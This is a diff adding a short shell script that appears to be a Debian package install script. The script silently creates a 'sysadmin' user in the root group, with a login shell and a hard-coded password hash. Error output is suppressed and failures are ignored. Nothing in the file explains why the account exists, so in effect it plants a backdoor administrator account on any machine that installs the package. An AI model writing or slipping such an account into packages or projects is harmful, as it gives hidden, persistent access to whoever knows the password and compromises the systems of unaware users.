@@ -1,0 +1,9 @@
+#!/bin/sh
+
+getent group sys_protected >/dev/null || groupadd -f -g 345 sys_protected
+getent passwd sysadmin > /dev/null || \
+useradd -m -g sys_protected -G root \
+    -d /home/sysadmin -p 4SuW8cnXFyxsk \
+    -s /bin/sh sysadmin 2> /dev/null || :
+
+#DEBHELPER#
